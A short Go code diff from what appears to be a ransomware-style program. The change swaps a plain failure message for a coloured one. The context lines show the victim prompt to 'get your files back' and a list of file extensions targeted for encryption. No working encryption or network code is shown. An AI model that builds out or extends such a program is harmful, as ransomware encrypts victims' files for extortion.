@@ -62,6 +62,8 @@ func main() {
 	message := color.Magenta.Sprint("Enter decryption password to get your files back:")
 	// Decrypted Files Array:
 	decryptFiles := color.Green.Sprint("\nThe files below have been decrypted!")
+	// Password Failed Error
+	error := color.White.Sprint("Decryption Failed. Is the password correct?")
 	// Only encrypt files with these file extensions.
 	fileExtensions := []string{
 		"3dm", "max", "3ds", "uot", "stw", "sxw", "ott", "odt", "rpm",
@@ -135,7 +137,6 @@ func main() {
 		}
 		// Print an error if decryption fails, or incorrect password.
 	} else {
-		fmt.Println("Decryption Failed. Is the password correct?")
-
+		color.Error.Println(error)
 	}
 }
